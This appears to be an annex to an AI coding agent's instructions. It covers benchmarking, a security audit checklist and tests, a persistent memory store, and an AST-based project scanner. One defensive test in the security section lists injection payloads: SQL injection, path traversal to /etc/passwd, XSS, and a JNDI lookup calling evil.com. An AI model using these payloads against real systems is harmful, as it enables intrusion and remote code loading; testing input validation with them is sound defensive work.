# ANNEX: ADVANCED AGENT CAPABILITIES

## ANNEX A: PERFORMANCE BENCHMARKING
### A.1 Benchmark Requirements
For any implementation, you MUST include performance benchmarks when:

Processing > 1,000 items

Involves I/O operations (DB, API, file)

Has potential concurrency/parallelism concerns

Uses caching or memoization

### A.2 Benchmark Structure
```python
import time
import statistics
from typing import Callable, Any, List, Tuple

# region BenchmarkRunner
class BenchmarkRunner:
    def __init__(self, iterations: int = 100, warmup: int = 10):
        self.iterations = iterations
        self.warmup = warmup
    
    def run(self, func: Callable, *args, **kwargs) -> dict:
        """Run benchmark with warmup phase and statistics."""
        # Warmup
        for _ in range(self.warmup):
            func(*args, **kwargs)
        
        # Actual measurement
        times = []
        for _ in range(self.iterations):
            start = time.perf_counter()
            result = func(*args, **kwargs)
            elapsed = time.perf_counter() - start
            times.append(elapsed)
        
        return {
            "min": min(times),
            "max": max(times),
            "mean": statistics.mean(times),
            "median": statistics.median(times),
            "p95": statistics.quantiles(times, n=20)[18],  # 95th percentile
            "p99": statistics.quantiles(times, n=100)[98],  # 99th percentile
            "std_dev": statistics.stdev(times) if len(times) > 1 else 0,
            "ops_per_sec": 1.0 / statistics.mean(times),
            "result": result  # Preserve result for validation
        }
```

### A.3 Performance Test Examples
```python
# In tests/test_performance.py
import pytest
from .benchmark import BenchmarkRunner

class TestEmailServicePerformance:
    def test_send_email_throughput(self, email_service, sample_emails):
        """Benchmark: 1000 emails, measure throughput."""
        benchmark = BenchmarkRunner(iterations=100, warmup=20)
        
        def send_all():
            futures = [email_service.send_async(email) for email in sample_emails]
            return [f.result() for f in futures]
        
        results = benchmark.run(send_all)
        
        # Assertions
        assert results["mean"] < 5.0  # <5 seconds for 1000 emails
        assert results["p95"] < 8.0   # 95% under 8 seconds
        assert results["ops_per_sec"] > 100  # >100 ops/sec
        
        # Log results for visibility
        logger.info("Performance: mean=%.3fs, p95=%.3fs, ops/sec=%.1f",
                   results["mean"], results["p95"], results["ops_per_sec"])
    
    def test_memory_usage(self, email_service):
        """Benchmark: Memory usage under load."""
        import tracemalloc
        
        tracemalloc.start()
        
        # Simulate heavy load
        emails = generate_emails(10000)
        futures = [email_service.send_async(e) for e in emails[:1000]]
        for f in futures:
            try:
                f.result(timeout=5)
            except Exception:
                pass
        
        current, peak = tracemalloc.get_traced_memory()
        tracemalloc.stop()
        
        # Assert memory constraints
        assert peak < 512 * 1024 * 1024  # < 512MB peak
        assert current < 256 * 1024 * 1024  # < 256MB current
        
        logger.info("Memory: peak=%.2fMB, current=%.2fMB",
                   peak / (1024*1024), current / (1024*1024))
```

### A.4 Benchmark Output Format
Each iteration MUST include a performance section:

```markdown
### Performance Benchmark Results
- **Test Scenario**: {describe what was tested}
- **Iterations**: {N} (warmup: {M})
- **Mean Latency**: {value} ms (± {std_dev})
- **p95 Latency**: {value} ms
- **p99 Latency**: {value} ms
- **Throughput**: {value} ops/sec
- **Memory Peak**: {value} MB
- **Memory Current**: {value} MB
- **Result**: ✅ PASS / ❌ FAIL (with threshold)
- **Regression Risk**: {low/medium/high} - {justification}
```

### A.5 Performance Regression Detection
```python
# performance_baseline.json
{
    "send_email_async": {
        "mean_ms": 42.3,
        "p95_ms": 78.1,
        "ops_per_sec": 236.4,
        "memory_mb": 45.2,
        "thresholds": {
            "mean_ms": {"warning": 1.5, "critical": 2.0},  # multiplier
            "p95_ms": {"warning": 1.4, "critical": 1.8},
            "ops_per_sec": {"warning": 0.8, "critical": 0.6},  # fraction
            "memory_mb": {"warning": 1.3, "critical": 1.5}
        }
    }
}
```

## ANNEX B: SECURITY AUDIT
### B.1 Mandatory Security Checks
Before finalizing any code, perform a security audit covering:

- 1. Input Validation
All external inputs validated (type, range, format, length)
SQL injection prevention (use parameterized queries, never concatenation)
Command injection prevention (avoid shell=True, validate paths)
XSS prevention (escape HTML/JSON outputs)

- 2. Authentication & Authorization
Sensitive endpoints require authentication
Proper role-based access control (RBAC)
No hardcoded credentials in code
Use environment variables or secrets manager

- 3. Data Protection
No PII (Personally Identifiable Information) in logs
Sensitive fields redacted in string representations
Encryption at rest and in transit where required
Use secrets module for cryptographic randomness

- 4. Dependency Security
Check for known vulnerabilities (CVE)
Pin dependencies to specific versions
Use pip-audit or safety for vulnerability scanning

- 5. Error Handling
No stack traces exposed to end users
Generic error messages for external callers
Internal error details logged securely

- 6. Rate Limiting
Protect against DoS attacks
Implement rate limiting for public endpoints
Use exponential backoff for retries

### B.2 Security Audit Checklist Format

### Security Audit Report

#### Input Validation
- [ ] All external parameters validated with type checking
- [ ] SQL queries use parameterized statements
- [ ] File paths validated (no path traversal)
- [ ] HTML/JSON escaped for output (if UI)

#### Authentication & Authorization
- [ ] No hardcoded secrets
- [ ] Credentials from environment variables
- [ ] Authentication required for sensitive operations
- [ ] Proper permission checks

#### Data Protection
- [ ] No PII in logs
- [ ] Sensitive fields marked as `__repr__` redacted
- [ ] Encryption used for sensitive data at rest
- [ ] Secure random generation (secrets module)

#### Dependencies
- [ ] No known CVE vulnerabilities (pip-audit run)
- [ ] Pinned dependencies with version ranges
- [ ] No deprecated/banned packages

#### Error Handling
- [ ] No stack traces exposed externally
- [ ] Internal errors logged with full context
- [ ] Generic error messages for external callers

#### Rate Limiting
- [ ] Rate limiting implemented for public endpoints
- [ ] Retry with backoff for failure recovery

#### Vulnerabilities Found
- {List any findings with severity: HIGH/MEDIUM/LOW}
- {For each: description, affected code, mitigation}

#### Remediation
- {Changes made to address findings}
- {Open issues needing manual review}

### B.3 Security Test Examples
```python
# tests/test_security.py
import pytest
from unittest.mock import patch, MagicMock

class TestEmailServiceSecurity:
    def test_no_credentials_in_logs(self, email_service, caplog):
        """Security: Verify credentials aren't logged."""
        with caplog.at_level(logging.INFO):
            # Attempt to send with a password
            email_service.send(
                to="test@example.com",
                auth_token="secret_password_123"
            )
        
        # Assert password not in logs
        assert "secret_password_123" not in caplog.text
    
    def test_input_validation_prevents_injection(self, email_service):
        """Security: Test injection attempts are blocked."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "<script>alert('XSS')</script>",
            "${jndi:ldap://evil.com/exploit}",
        ]
        
        for malicious in malicious_inputs:
            with pytest.raises((ValueError, TypeError)) as exc:
                email_service.send(to=malicious, subject="test")
            # Verify validation prevented the injection
            assert "Invalid" in str(exc.value) or "not allowed" in str(exc.value)
    
    def test_rate_limiting_prevents_dos(self, email_service):
        """Security: Rate limiting protects against DoS."""
        # Send 1000 emails rapidly
        with pytest.raises(RateLimitExceeded) as exc:
            for _ in range(1000):
                email_service.send(to=f"test{_}@example.com")
        
        assert "Rate limit exceeded" in str(exc.value)
```

B.4 Security Headers (for APIs)
```python
# If serving HTTP APIs, add these headers
SECURITY_HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "X-XSS-Protection": "1; mode=block",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Content-Security-Policy": "default-src 'self'",
    "Cache-Control": "no-store, max-age=0",
}
```

## ANNEX C: MEMORY SYSTEM
### C.1 System Description
The agent must maintain a persistent memory system across interactions. This enables:

Context retention across multiple iterations
Learning from past decisions and corrections
Consistency across related tasks
Audit trail of architectural choices

### C.2 Memory Structure
```python
# memory.json - Persistent memory storage
{
    "session_id": "uuid-v4",
    "created_at": "2024-01-15T10:30:00Z",
    "last_updated": "2024-01-15T14:45:00Z",
    "context": {
        "project_name": "email-service",
        "architecture": "hexagonal",
        "python_version": "3.10",
        "team_size": 3,
        "deployment_target": "aws-ec2"
    },
    "decisions": [
        {
            "id": "decision-001",
            "timestamp": "2024-01-15T10:35:00Z",
            "category": "architecture",
            "decision": "Selected Hexagonal Architecture",
            "rationale": "Complex business logic, long-term maintainability",
            "alternatives": ["layered", "clean"],
            "status": "confirmed",
            "iteration": 1
        },
        {
            "id": "decision-002",
            "timestamp": "2024-01-15T11:20:00Z",
            "category": "pattern",
            "decision": "Used Builder pattern for EmailConfig",
            "rationale": "Fluent API, immutable configuration",
            "alternatives": ["factory", "constructor"],
            "status": "refined",
            "iteration": 2
        }
    ],
    "learnings": [
        {
            "id": "learning-001",
            "timestamp": "2024-01-15T12:00:00Z",
            "lesson": "Retry logic should use exponential backoff",
            "source": "adversarial_challenge",
            "applied_to": "EmailService.send_with_retry",
            "verified": True
        },
        {
            "id": "learning-002",
            "timestamp": "2024-01-15T13:15:00Z",
            "lesson": "Use ConnectionPool for SMTP to improve performance",
            "source": "performance_benchmark",
            "applied_to": "EmailAdapter",
            "verified": True
        }
    ],
    "test_coverage": {
        "domain_models": 1.0,
        "services": 0.92,
        "adapters": 0.85,
        "overall": 0.91,
        "last_measured": "2024-01-15T14:00:00Z"
    },
    "security_findings": [
        {
            "id": "security-001",
            "severity": "HIGH",
            "description": "Credentials logged in debug mode",
            "status": "fixed",
            "fixed_in": "iteration_3"
        }
    ],
    "performance_baselines": {
        "send_email": {
            "mean_ms": 42.3,
            "p95_ms": 78.1,
            "ops_per_sec": 236.4,
            "measured_at": "2024-01-15T14:30:00Z"
        }
    },
    "pending_items": [
        "Add async retry with circuit breaker",
        "Implement email template engine",
        "Add monitoring with Prometheus"
    ],
    "reflection_log": [
        {
            "timestamp": "2024-01-15T12:00:00Z",
            "phase": "self_review",
            "content": "Retry logic should be more configurable",
            "action_taken": "Added retry strategy interface"
        }
    ]
}
```

### C.3 Memory Operations API
```python
# memory_system.py
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional
import json
import uuid

# region MemorySystem
class MemorySystem:
    def __init__(self, memory_file: str = "memory.json"):
        self.memory_file = memory_file
        self._data = self._load() or self._init_memory()
    
    def _init_memory(self) -> dict:
        """Initialize fresh memory."""
        return {
            "session_id": str(uuid.uuid4()),
            "created_at": datetime.utcnow().isoformat(),
            "last_updated": datetime.utcnow().isoformat(),
            "context": {},
            "decisions": [],
            "learnings": [],
            "test_coverage": {},
            "security_findings": [],
            "performance_baselines": {},
            "pending_items": [],
            "reflection_log": []
        }
    
    def _load(self) -> Optional[dict]:
        """Load memory from disk."""
        try:
            with open(self.memory_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return None
    
    def save(self) -> None:
        """Save memory to disk."""
        self._data["last_updated"] = datetime.utcnow().isoformat()
        with open(self.memory_file, 'w') as f:
            json.dump(self._data, f, indent=2)
    
    def add_decision(self, category: str, decision: str, 
                    rationale: str, alternatives: List[str]) -> str:
        """Record an architectural decision."""
        entry = {
            "id": f"decision-{len(self._data['decisions']) + 1:03d}",
            "timestamp": datetime.utcnow().isoformat(),
            "category": category,
            "decision": decision,
            "rationale": rationale,
            "alternatives": alternatives,
            "status": "proposed",
            "iteration": len(self._data.get("reflection_log", [])) + 1
        }
        self._data["decisions"].append(entry)
        self.save()
        return entry["id"]
    
    def add_learning(self, lesson: str, source: str, 
                     applied_to: str) -> str:
        """Record a lesson learned."""
        entry = {
            "id": f"learning-{len(self._data['learnings']) + 1:03d}",
            "timestamp": datetime.utcnow().isoformat(),
            "lesson": lesson,
            "source": source,
            "applied_to": applied_to,
            "verified": False
        }
        self._data["learnings"].append(entry)
        self.save()
        return entry["id"]
    
    def update_test_coverage(self, coverage: Dict[str, float]) -> None:
        """Update test coverage metrics."""
        self._data["test_coverage"] = {
            **coverage,
            "last_measured": datetime.utcnow().isoformat()
        }
        self.save()
    
    def log_reflection(self, phase: str, content: str, 
                      action_taken: str) -> None:
        """Log a reflection from a review phase."""
        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "phase": phase,
            "content": content,
            "action_taken": action_taken
        }
        self._data["reflection_log"].append(entry)
        self.save()
    
    def get_context_for_iteration(self) -> dict:
        """Return relevant context for current iteration."""
        return {
            "architecture": self._data["context"].get("architecture"),
            "known_decisions": self._data["decisions"][-5:],  # Last 5
            "pending_items": self._data["pending_items"],
            "current_coverage": self._data["test_coverage"],
            "last_performance": self._data["performance_baselines"],
            "security_concerns": [
                f for f in self._data["security_findings"] 
                if f["status"] != "fixed"
            ]
        }
```

### C.4 Memory Usage in Iterations

```markdown
## Memory Summary (Iteration N)
- **Session ID**: {uuid}
- **Active Decisions**: {count}
- **Learnings Applied**: {count}
- **Test Coverage**: {overall}% (Δ {+/-X}% from previous)
- **Security Findings**: {open} open, {fixed} fixed
- **Performance Trends**: {improved/stable/degraded}
- **Pending Items**: {count}
```

## ANNEX D: DETERMINISTIC PROJECT READING SYSTEM
### D.1 System Description
A deterministic system for reading and understanding project structure before making changes. This prevents:
Missing context about existing code
Duplicating functionality
Breaking existing contracts
Inconsistent style/patterns

### D.2 Project Scanner
```python
# project_scanner.py
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Set, Optional, Any
import ast
import tokenize
import builtins

# region ProjectFile
@dataclass
class ProjectFile:
    path: Path
    content: str
    imports: List[str] = field(default_factory=list)
    classes: List[str] = field(default_factory=list)
    functions: List[str] = field(default_factory=list)
    constants: Dict[str, Any] = field(default_factory=dict)
    dependencies: Set[str] = field(default_factory=set)
    exports: List[str] = field(default_factory=list)  # __all__
    docstring: Optional[str] = None
    region_markers: List[Dict[str, str]] = field(default_factory=list)  # region/endregion

# region ProjectStructure
@dataclass
class ProjectStructure:
    root: Path
    files: List[ProjectFile] = field(default_factory=list)
    packages: Dict[str, List[ProjectFile]] = field(default_factory=dict)
    imports_graph: Dict[str, Set[str]] = field(default_factory=dict)
    test_files: List[Path] = field(default_factory=list)
    config_files: Dict[Path, str] = field(default_factory=dict)
    public_api: Set[str] = field(default_factory=set)
    entry_points: List[Path] = field(default_factory=list)
    missing_docs: List[Path] = field(default_factory=list)
    
    def find_class(self, class_name: str) -> Optional[ProjectFile]:
        """Find file containing a class definition."""
        for file in self.files:
            if class_name in file.classes:
                return file
        return None
    
    def find_function(self, func_name: str) -> Optional[ProjectFile]:
        """Find file containing a function definition."""
        for file in self.files:
            if func_name in file.functions:
                return file
        return None
    
    def get_dependencies(self, file_path: Path) -> Set[str]:
        """Get dependencies for a specific file."""
        for file in self.files:
            if file.path == file_path:
                return file.dependencies
        return set()
    
    def get_affected_files(self, changed_file: Path) -> Set[Path]:
        """Find files affected by a change (reverse dependencies)."""
        affected = set()
        for file in self.files:
            if str(changed_file) in file.dependencies:
                affected.add(file.path)
        return affected
```

### D.3 AST Parser Implementation
```python
# ast_parser.py
import ast
import tokenize
from pathlib import Path
from typing import List, Dict, Set, Optional, Any

# region ASTParser
class ASTParser:
    """Parse Python files using AST for deterministic analysis."""
    
    def parse_file(self, file_path: Path) -> Optional[ProjectFile]:
        """Parse a single Python file."""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                tree = ast.parse(content)
            
            imports = self._extract_imports(tree)
            classes = self._extract_classes(tree)
            functions = self._extract_functions(tree)
            constants = self._extract_constants(tree)
            docstring = ast.get_docstring(tree)
            region_markers = self._extract_regions(content)
            
            # Determine exports (__all__)
            exports = self._extract_exports(tree)
            
            # Find dependencies (imported modules)
            dependencies = set()
            for imp in imports:
                if '.' in imp:
                    dependencies.add(imp.split('.')[0])
                else:
                    dependencies.add(imp)
            
            return ProjectFile(
                path=file_path,
                content=content,
                imports=imports,
                classes=classes,
                functions=functions,
                constants=constants,
                dependencies=dependencies,
                exports=exports,
                docstring=docstring,
                region_markers=region_markers
            )
        except (SyntaxError, OSError) as e:
            # Log but continue
            return None
    
    def _extract_imports(self, tree: ast.AST) -> List[str]:
        """Extract all import statements."""
        imports = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imports.append(alias.name)
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    imports.append(node.module)
        return imports
    
    def _extract_classes(self, tree: ast.AST) -> List[str]:
        """Extract all class names."""
        classes = []
        for node in ast.walk(tree):
            if isinstance(node, ast.ClassDef):
                classes.append(node.name)
        return classes
    
    def _extract_functions(self, tree: ast.AST) -> List[str]:
        """Extract all function names (top-level and methods)."""
        functions = []
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                functions.append(node.name)
        return functions
    
    def _extract_constants(self, tree: ast.AST) -> Dict[str, Any]:
        """Extract module-level constants (UPPER_CASE)."""
        constants = {}
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        if target.id.isupper():
                            # Try to evaluate if simple literal
                            try:
                                if isinstance(node.value, ast.Constant):
                                    constants[target.id] = node.value.value
                            except Exception:
                                constants[target.id] = "<complex>"
        return constants
    
    def _extract_exports(self, tree: ast.AST) -> List[str]:
        """Extract __all__ exports."""
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name) and target.id == "__all__":
                        if isinstance(node.value, ast.List):
                            exports = []
                            for elt in node.value.elts:
                                if isinstance(elt, ast.Constant):
                                    exports.append(elt.value)
                            return exports
        return []
    
    def _extract_regions(self, content: str) -> List[Dict[str, str]]:
        """Extract # region / # endregion markers."""
        regions = []
        for line in content.split('\n'):
            if '# region' in line:
                regions.append({
                    "type": "start",
                    "name": line.split('# region')[1].strip()
                })
            elif '# endregion' in line:
                regions.append({"type": "end"})
        return regions
```

### D.4 Project Reader (High-level Orchestration)
```python
# project_reader.py
from pathlib import Path
from typing import List, Dict, Optional, Set
import json
import subprocess

# region ProjectReader
class ProjectReader:
    """Deterministic project reading and analysis."""
    
    def __init__(self, project_root: Path):
        self.project_root = project_root
        self.parser = ASTParser()
        self.structure: Optional[ProjectStructure] = None
        self._cache = {}  # Cache parsed files
    
    def read_project(self) -> ProjectStructure:
        """Read entire project structure deterministically."""
        structure = ProjectStructure(root=self.project_root)
        
        # 1. Find all Python files
        py_files = list(self.project_root.rglob("*.py"))
        structure.files = [
            self.parser.parse_file(f) 
            for f in py_files 
            if self.parser.parse_file(f) is not None
        ]
        
        # 2. Group by package
        for file in structure.files:
            package = self._get_package(file.path)
            if package not in structure.packages:
                structure.packages[package] = []
            structure.packages[package].append(file)
        
        # 3. Build import graph
        structure.imports_graph = self._build_import_graph(structure.files)
        
        # 4. Identify test files
        structure.test_files = [
            f.path for f in structure.files 
            if "test_" in f.path.name or "test_" in f.path.parent.name
        ]
        
        # 5. Find config files
        for ext in [".toml", ".json", ".yaml", ".yml", ".ini"]:
            for file in self.project_root.rglob(f"*{ext}"):
                structure.config_files[file] = ext
        
        # 6. Find entry points (__main__)
        structure.entry_points = [
            f.path for f in structure.files 
            if "__main__" in f.content
        ]
        
        # 7. Detect public API
        for file in structure.files:
            if file.exports:
                structure.public_api.update(file.exports)
            elif file.classes:
                structure.public_api.update(file.classes)
            elif file.functions:
                structure.public_api.update(file.functions)
        
        # 8. Find missing documentation
        structure.missing_docs = [
            f.path for f in structure.files 
            if not f.docstring and f.classes  # Classes should have docstrings
        ]
        
        self.structure = structure
        return structure
    
    def _get_package(self, file_path: Path) -> str:
        """Get package name from file path."""
        rel_path = file_path.relative_to(self.project_root)
        parent = rel_path.parent
        return str(parent).replace("/", ".") if str(parent) != "." else "root"
    
    def _build_import_graph(self, files: List[ProjectFile]) -> Dict[str, Set[str]]:
        """Build a graph of imports between files."""
        graph = {}
        for file in files:
            key = str(file.path.relative_to(self.project_root))
            graph[key] = file.dependencies
        return graph
    
    def get_file_summary(self, path: Path) -> Dict[str, Any]:
        """Get a summary of a specific file."""
        file = next((f for f in self.structure.files if f.path == path), None)
        if not file:
            return {}
        
        return {
            "path": str(file.path),
            "classes": file.classes,
            "functions": file.functions,
            "imports": file.imports,
            "exports": file.exports,
            "has_docstring": bool(file.docstring),
            "regions": len(file.region_markers),
            "dependencies": len(file.dependencies),
            "affected_by_changes": self.structure.get_affected_files(path)
        }
    
    def analyze_impact(self, file_path: Path) -> Dict[str, Any]:
        """Analyze impact of modifying a file."""
        structure = self.structure
        
        # Find file in structure
        file = next((f for f in structure.files if f.path == file_path), None)
        if not file:
            return {"error": "File not found"}
        
        # Determine what depends on this file
        dependents = []
        for f in structure.files:
            if str(file_path) in f.dependencies:
                dependents.append(str(f.path))
        
        # Determine what this file depends on
        dependencies = list(file.dependencies)
        
        # Determine test coverage impact
        tests = [t for t in structure.test_files if file_path.name in t.name]
        
        return {
            "file": str(file_path),
            "dependencies": dependencies,
            "dependents": dependents,
            "affects_tests": bool(tests),
            "test_files": [str(t) for t in tests],
            "part_of_public_api": any(
                cls in structure.public_api 
                for cls in file.classes
            ),
            "is_entry_point": file_path in structure.entry_points,
            "impact_level": "HIGH" if dependents else "MEDIUM",
            "change_risk": self._calculate_risk(file, dependents)
        }
    
    def _calculate_risk(self, file: ProjectFile, dependents: List[str]) -> str:
        """Calculate change risk level."""
        risk = 0
        if dependents:
            risk += 2
        if file.classes:
            risk += 1
        if any(cls in self.structure.public_api for cls in file.classes):
            risk += 2
        if file.path in self.structure.entry_points:
            risk += 1
        if not file.docstring:
            risk += 1  # Poorly documented = higher risk
        
        if risk >= 5:
            return "HIGH"
        elif risk >= 3:
            return "MEDIUM"
        return "LOW"
```

### D.5 Deterministic Reading Protocol
Before ANY change, the agent MUST:
Read Project Structure

```python
reader = ProjectReader(Path("/path/to/project"))
structure = reader.read_project()
print(f"Found {len(structure.files)} Python files")
print(f"Found {len(structure.test_files)} test files")
print(f"Public API: {structure.public_api}")
```

Analyze Impact

```python
impact = reader.analyze_impact(Path("utils/tools/email/service.py"))
print(f"Impact Level: {impact['impact_level']}")
print(f"Dependents: {impact['dependents']}")
```

Check for Duplicates

```python
# Check if the class/function already exists
existing_class = structure.find_class("EmailService")
if existing_class:
    print(f"Class already exists in {existing_class.path}")
    # Consider extending instead of creating new
```

Understand Style Patterns

```python
# Sample existing files to understand patterns
sample_files = structure.files[:3]
for f in sample_files:
    print(f"File: {f.path}")
    print(f"  Region markers: {len(f.region_markers)}")
    print(f"  Imports: {', '.join(f.imports[:3])}")
    print(f"  Classes: {', '.join(f.classes)}")
```

Generate Context Summary

```markdown
## Project Reading Summary
- **Total Files**: {N} Python files
- **Test Files**: {M} test files
- **Packages**: {P} packages
- **Public API**: {API} exported symbols
- **Entry Points**: {EP} entry points
- **Missing Documentation**: {MD} files without docstrings
- **Import Graph**: {IG} edges
- **Most Impactful Files**: {list of files with HIGH change_risk}
- **Current Architecture**: {detected from patterns}
```

### Package Structure
{root}/
├── core/
│ ├── models.py (3 classes, 2 functions)
│ └── services.py (2 classes, 5 functions)
├── adapters/
│ ├── email_adapter.py (1 class)
│ └── db_adapter.py (1 class, 4 functions)
└── tests/
├── test_models.py (12 tests)
└── test_services.py (8 tests)

```text

### Key Dependencies
- {lib1} (used by {N} files)
- {lib2} (used by {M} files)

### Change Impact Zones
- **API Changes**: {list of files}
- **Domain Changes**: {list of files}
- **Test Updates Required**: {list of files}
```

### D.6 Combined Workflow Example
```python
# Complete workflow for agent iteration
def agent_workflow(project_root: Path, task: str):
    # 1. Read project deterministically
    reader = ProjectReader(project_root)
    structure = reader.read_project()
    
    # 2. Load memory
    memory = MemorySystem("memory.json")
    
    # 3. Get context
    context = memory.get_context_for_iteration()
    context["project_structure"] = structure
    
    # 4. Perform task with full context
    # ... agent logic ...
    
    # 5. After changes, re-scan to detect impact
    changed_files = detect_changed_files()
    for file in changed_files:
        impact = reader.analyze_impact(file)
        if impact["impact_level"] == "HIGH":
            # Run additional tests
            run_impact_tests(impact["test_files"])
    
    # 6. Update memory with learnings
    memory.add_learning(
        lesson=f"Modified {len(changed_files)} files",
        source="change_analysis",
        applied_to=task
    )
    memory.save()
```

